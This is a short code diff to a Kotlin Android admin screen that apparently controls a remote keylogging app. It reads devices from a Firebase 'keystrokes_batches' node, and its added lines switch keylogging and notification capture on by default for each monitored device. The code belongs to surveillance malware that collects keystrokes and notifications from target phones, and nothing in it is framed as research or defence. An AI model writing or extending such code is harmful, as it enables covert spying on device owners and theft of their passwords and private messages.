@@ -57,7 +57,7 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
+        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 for (child in snapshot.children) {
@@ -77,6 +77,15 @@ class AdminMainActivity : AppCompatActivity() {
 
     private fun listenToDeviceState(deviceName: String) {
         val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
+        
+        // Ensure defaults exist in Firebase if not already present
+        cmdRef.child("keylogging").get().addOnSuccessListener { 
+            if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
+        }
+        cmdRef.child("notifications").get().addOnSuccessListener { 
+            if (!it.exists()) cmdRef.child("notifications").setValue(true) 
+        }
+
         cmdRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val keyObj = snapshot.child("keylogging").value
